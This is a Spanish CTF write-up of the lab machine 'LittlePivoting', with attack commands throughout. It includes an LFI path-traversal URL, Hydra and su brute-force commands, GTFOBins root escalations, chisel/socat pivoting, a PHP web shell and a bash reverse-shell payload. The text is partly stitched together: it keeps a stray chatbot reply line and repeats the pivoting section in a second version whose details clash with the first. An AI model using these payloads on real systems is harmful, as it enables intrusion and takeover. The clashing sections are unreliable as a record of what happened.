# Máquina: LittlePivoting  
**Dificultad:** Medio  
**Dirección IP:** 10.10.10.2

## Reconocimiento

Para comenzar, realizamos un escaneo general de la máquina objetivo utilizando Nmap, lo que nos permitió identificar los servicios activos en los puertos principales.

```bash
nmap -p- -sS --min-rate 5000 -v -n -Pn 10.10.10.2 -oN escaneo_completo.txt
```

**Resultado del escaneo**:  
- **Puerto 22**: SSH (OpenSSH 9.2p1)
- **Puerto 80**: HTTP (Apache 2.4.57)

**Captura de pantalla del resultado de Nmap**.

A continuación, exploramos el sitio web en el puerto 80 utilizando el navegador para ver si hay contenido visible y analizar posibles puntos de entrada.

**Captura de pantalla del sitio web inicial**.

### Fuzzing

Para identificar directorios o archivos ocultos en el servidor web, ejecutamos `gobuster` con una lista de palabras común:

```bash
gobuster dir -u http://10.10.10.2 -w /usr/share/wordlist/seclist/discovery/web-content/directory-list-2.3-medium.txt -t 150 -o gobuster.txt
```

Entre los resultados, encontramos un directorio interesante llamado `/shop`. Procedemos a inspeccionar su contenido.

**Captura de pantalla de la salida de Gobuster**.

Exploramos el directorio `/shop` y tratamos de manipular el parámetro `archivo` en la URL para realizar pruebas de inclusión de archivos locales (LFI).

URL probada:

```http
http://10.10.10.2/shop/index.php?archivo=../../../../../etc/passwd
```

**Captura de pantalla del resultado mostrando el contenido de `/etc/passwd`**.

La prueba fue exitosa, confirmando una vulnerabilidad de Inclusión Local de Archivos (LFI) mediante Path Traversal.

Desde el archivo `/etc/passwd`, identificamos dos usuarios adicionales al usuario `root`:
- **seller**
- **manchi**

---

## Explotación

Dado que la máquina tiene el puerto SSH abierto, planteamos la posibilidad de intentar un ataque de fuerza bruta contra el servicio SSH para el usuario `manchi`. Utilizamos la herramienta Hydra junto con el diccionario `rockyou.txt`:

```bash
hydra -l manchi -P rockyou.txt ssh://10.10.10.2 -V
```

**Captura de pantalla del proceso de Hydra mostrando el intento de autenticación exitoso**.

La contraseña descubierta para el usuario `manchi` fue `lovely`. Con estas credenciales, procedemos a iniciar sesión en SSH:

```bash
ssh manchi@10.10.10.2
```

**Captura de pantalla de la conexión SSH exitosa**.

---

## Post-Explotación

Estando ya dentro del sistema, analizamos posibles vectores de escalada de privilegios. Comenzamos revisando si `manchi` tiene permisos para ejecutar comandos como superusuario con el siguiente comando:

```bash
sudo -l
```

**Captura de pantalla de la salida del comando `sudo -l`**.

En este caso, no encontramos permisos especiales para `manchi`.

### BruteForcing con `su`

Como siguiente paso, optamos por utilizar la herramienta `suBF.sh`, que permite realizar fuerza bruta contra el comando `su` para cambiar a otros usuarios. La herramienta está disponible en el repositorio de GitHub de carlospolop.

1. **Descargamos el archivo `suBF.sh`:**
   ```bash
   wget https://raw.githubusercontent.com/carlospolop/su-bruteforce/master/suBF.sh
   ```

2. **Transferimos el archivo a la máquina objetivo** utilizando un servidor Python:
   ```bash
   python3 -m http.server 8080
   wget http://10.10.10.1:8080/suBF.sh
   ```

3. **Ejecutamos la herramienta** para intentar fuerza bruta en el usuario `seller` con el diccionario `rockyou.txt`:

   ```bash
   ./suBF.sh -u seller -w rockyou.txt
   ```

**Captura de pantalla del proceso y resultado de `suBF.sh`**.

Obtuvimos la contraseña `qwerty` para el usuario `seller`. Al ingresar con este usuario, confirmamos que `seller` tiene permisos `sudo` para ejecutar el binario `/usr/bin/php` con privilegios elevados.

### Escalada de Privilegios

Según [GTFOBins](https://gtfobins.github.io/), el binario `/usr/bin/php` puede explotarse para escalar privilegios mediante el siguiente comando:

```bash
sudo php -r "system('/bin/bash');"
```

**Captura de pantalla del momento en que obtenemos acceso root**.

Con esto, hemos obtenido privilegios de root.

Aquí tienes la continuación del writeup de pivoting para la máquina "LittlePivoting" con tus instrucciones, indicaciones de capturas de pantalla y adaptado con más detalles:

---

## Pivoting y Reconocimiento en Red

Después de obtener acceso a la máquina `10.10.10.2`, investigamos la configuración de red para detectar posibles interfaces adicionales.

### Verificación de interfaces de red
Usamos el siguiente comando para identificar otras IPs de la máquina comprometida:

```bash
hostname -I
```

> [**Captura de pantalla**: Salida del comando `hostname -I`, mostrando las IPs detectadas.]

Se observa que esta máquina tiene otra interfaz en la red `20.20.20.2`. Esto sugiere la posibilidad de conectividad a otro segmento de red, lo que requiere un nuevo reconocimiento.

---

### Reconocimiento en el segmento 20.20.20.0/24

Para explorar esta red, creamos un script en Bash que hace ping a cada host en el rango de `20.20.20.1` a `20.20.20.254`, verificando qué IPs responden y están activas:

```bash
#!/bin/bash
for host in $(seq 1 254); do
    timeout 1 bash -c "ping -c 1 20.20.20.$host &>/dev/null" && echo "[+] HOST - 20.20.20.$host is alive!" &
done; wait
```

> [**Captura de pantalla**: Ejecución del script mostrando las IPs activas en la red `20.20.20.0/24`.]

Detectamos otra máquina activa en la IP `20.20.20.3`, lo que indica un posible nuevo objetivo de explotación.

---

## Acceso al Sistema Remoto [20.20.20.3]

Para esta etapa, configuraremos una técnica de túnel inverso usando `chisel` para tener un proxy SOCKS que facilite la enumeración del sistema `20.20.20.3`.

### Preparación de Chisel

1. **En la máquina atacante:** Ejecutamos el servidor de `chisel` en modo reverse:

   ```bash
   ./chisel server --reverse -p 1234
   ```

   > [**Captura de pantalla**: Inicio del servidor `chisel` en la máquina atacante.]

2. **En la máquina comprometida (`10.10.10.2`):** Conectamos a nuestro servidor de `chisel` para crear un túnel y utilizar un proxy SOCKS.

   ```bash
   ./chisel client 10.10.10.1:1234 R:socks
   ```

   > [**Captura de pantalla**: Conexión del cliente `chisel` en la máquina comprometida para el túnel SOCKS.]

### Configuración de Proxychains

Modificamos el archivo `proxychains4.conf` para activar la cadena dinámica y dirigirnos al proxy SOCKS creado:

1. **Descomentamos:** `dynamic_chain`
2. **Comentamos:** `#strict_chain`
3. **Agregamos:** `socks5 127.0.0.1 1080`

---

## Enumeración en la máquina 20.20.20.3

Con el túnel configurado, ahora podemos hacer un escaneo inicial de los puertos de la máquina `20.20.20.3` utilizando `proxychains` con `nmap` para identificar los servicios expuestos.

```bash
proxychains nmap -sCV --top-ports 100 -Pn -sT 20.20.20.3 -oN escaneo.txt 2>&1 | grep -vE 'timeout|OK'
```

> [**Captura de pantalla**: Resultados del escaneo Nmap de `20.20.20.3`.]

Detectamos que los puertos `22` (SSH) y `80` (HTTP) están abiertos. Procedemos a verificar el sitio web en el puerto `80` usando un navegador con `FoxyProxy` configurado para el proxy SOCKS.

> [**Captura de pantalla**: Configuración de FoxyProxy para el proxy SOCKS en Firefox.]

---

### Fuzzing y Detección de Directorios

Ejecutamos un escaneo con `gobuster` utilizando el proxy SOCKS para identificar directorios en el servidor web de `20.20.20.3`:

```bash
gobuster dir -w directory-list-2.3-medium.txt -u http://20.20.20.3 -x php -t 150 --proxy socks5://127.0.0.1:1080
```

> [**Captura de pantalla**: Salida de `gobuster` mostrando el directorio `/secret.php`.]

Accedemos a `/secret.php` y descubrimos al usuario `mario`. Decidimos intentar un ataque de fuerza bruta de credenciales sobre el servicio SSH.

---

## Explotación [20.20.20.3]

Usamos `hydra` para realizar fuerza bruta sobre el servicio SSH, pasando el proxy SOCKS y utilizando el diccionario `rockyou.txt`:

```bash
proxychains hydra -l mario -P rockyou.txt 20.20.20.3 ssh -V -I -F
```

> [**Captura de pantalla**: Éxito del ataque con credenciales `mario:chocolate`.]

---

### Post-Explotación y Escalada de Privilegios en 20.20.20.3

Tras acceder al sistema como `mario`, revisamos los permisos de `sudo`:

```bash
sudo -l
```

> [**Captura de pantalla**: Salida de `sudo -l`, mostrando que `vim` se puede ejecutar como cualquier usuario.]

Gracias a GTFOBins, encontramos que podemos aprovechar `vim` para escalar privilegios a `root`:

```bash
sudo vim -c ':/bin/bash'
```

> [**Captura de pantalla**: Obtención de la shell root.]

---

## Identificación de Nueva Interfaz de Red [30.30.30.2]

Al revisar nuevamente las interfaces de red en `20.20.20.3`, detectamos la IP `30.30.30.2`. Esto indica la posibilidad de otra máquina en el segmento `30.30.30.0/24`.

> [**Captura de pantalla**: Comando para mostrar interfaces de red y descubrir la IP `30.30.30.2`.]

---

## Reconocimiento en el segmento 30.30.30.0/24

Para descubrir hosts en esta red, reutilizamos el script de Bash, pero modificando el comando para que utilice TCP y evitar el uso de ICMP, ya que no responde a `ping`.

```bash
#!/bin/bash
for host in $(seq 1 254); do
    timeout 1 bash -c "echo '' > /dev/tcp/30.30.30.$host/80 &>/dev/null" && echo "[+] HOST - 30.30.30.$host" &
done; wait
```

> [**Captura de pantalla**: Ejecución del script mostrando cualquier IP activa en la red `30.30.30.0/24`.]

Con esto completamos el reconocimiento inicial de la nueva red, y estamos listos para realizar enumeración adicional si encontramos hosts activos.

### Writeup para la máquina *LittlePivoting*

---

**Objetivo**: Documentar el proceso de pentesting realizado en una máquina con múltiples interfaces de red y usar técnicas de pivoting para acceder a subredes internas.

---

## Fase 1: Reconocimiento inicial

1. **Identificación de interfaces de red**:
   ```bash
   hostname -I
   ```
   <sub>[Captura de pantalla del resultado]</sub>

   Observamos que la máquina con IP `10.10.10.2` tiene una segunda interfaz en la red `20.20.20.2`.

---

## Fase 2: Reconocimiento en la interfaz secundaria (20.20.20.2)

Para descubrir otros hosts en la subred, creamos un script en Bash:

```bash
#!/bin/bash
for host in $(seq 1 254); do
    timeout 1 bash -c "ping -c 1 20.20.20.$host &>/dev/null" && echo "[+] HOST - 20.20.20.$host is alive!" &
done; wait
```

<sub>[Captura del resultado del script]</sub>

Identificamos el host `20.20.20.3`, así que procederemos a realizar una enumeración manual usando **chisel** para crear un túnel inverso.

---

## Fase 3: Configuración de *chisel* para acceso al host 20.20.20.3

1. **Configuración en máquina atacante**:
   ```bash
   ./chisel server --reverse -p 1234
   ```
   <sub>[Captura de pantalla]</sub>

2. **Configuración en máquina víctima (`10.10.10.2/20.20.20.2`)**:
   ```bash
   ./chisel client 10.10.10.1:1234 R:socks
   ```

3. **Edición de `proxychains4.conf`**:
   ```text
   dynamic_chain
   # strict_chain (comentada)
   socks5 127.0.0.1 1080
   ```

---

## Fase 4: Enumeración del sistema en 20.20.20.3

1. **Escaneo de puertos**:
   ```bash
   proxychains nmap -sCV --top-ports 100 -Pn -sT 20.20.20.3 -oN escaneo.txt 2>&1 | grep -vE 'timeout|OK'
   ```
   <sub>[Captura del escaneo]</sub>

   - **Puerto 22**: SSH.
   - **Puerto 80**: HTTP.

2. **Acceso a sitio web en `20.20.20.3`**:
   - Usamos **FoxyProxy** en el navegador configurado para usar `socks5 127.0.0.1 1080`.

3. **Fuzzing de directorios**:
   ```bash
   gobuster dir -w directory-list-2.3-medium.txt -u http://20.20.20.3 -x php -t 150 --proxy socks5://127.0.0.1:1080
   ```
   <sub>[Captura del resultado]</sub>

   Encontramos el archivo `secret.php`.

---

## Fase 5: Explotación en 20.20.20.3

Subimos un archivo PHP malicioso:

```php
<?php
    system($_GET['cmd']);
?>
```
<sub>[Captura de la subida del archivo]</sub>

Probamos ejecutando un comando `id`:
```text
http://20.20.20.3/uploads/cmd.php?cmd=id
```
<sub>[Captura de pantalla]</sub>

---

## Fase 6: Pivoting a través de `socat` para conexión inversa

Para conectar `20.20.20.3` con nuestra máquina Kali a través de múltiples saltos:

1. **Configuración en `10.10.10.2/20.20.20.2`**:
   ```bash
   ./socat tcp-l:3001,fork,reuseaddr tcp:10.10.10.1:1234
   ```
   <sub>[Captura de configuración]</sub>

2. **Configuración en `20.20.20.3/30.30.30.2`**:
   ```bash
   ./chisel client 20.20.20.2:3001 R:1081:socks
   ```

3. **Configuración en `/etc/proxychains4.conf`**:
   ```text
   socks5 127.0.0.1 1081
   ```

---

## Fase 7: Enumeración en 30.30.30.3

Repetimos el escaneo de puertos, ahora apuntando a `30.30.30.3`, el host detectado en la subred `30.30.30.0/24`.

```bash
proxychains nmap -sCV --top-ports 100 -Pn -sT 30.30.30.3 -oN escaneo_30.txt 2>&1 | grep -vE 'timeout|OK'
```
<sub>[Captura del escaneo]</sub>

---

## Fase 8: Explotación en el servidor web de 30.30.30.3

1. **Subida de archivo PHP malicioso en 30.30.30.3**:
   - Intentamos acceder a `uploads/cmd.php` y ejecutamos comandos remotos.
   - Probamos con una *reverse shell* en el navegador:

   ```text
   http://30.30.30.3/uploads/cmd.php?cmd=bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/30.30.30.2/4444%200%3E%261%22
   ```
   <sub>[Captura de la reverse shell]</sub>

---

## Fase 9: Escalada de privilegios en 30.30.30.3

Revisamos permisos `sudo`:
```bash
sudo -l
```
<sub>[Captura]</sub>

Podemos ejecutar `/usr/bin/env` como root, así que usamos el comando en GTFOBins:

```bash
sudo env /bin/bash
```
<sub>[Captura como root]</sub>

---

## Conclusión

En este writeup, exploramos técnicas avanzadas de pentesting y pivoting utilizando herramientas como **chisel** y **socat**. Hemos cubierto la importancia de configurar correctamente **proxychains** para hacer saltos entre redes y aplicar estrategias de escalada de privilegios al final del proceso.

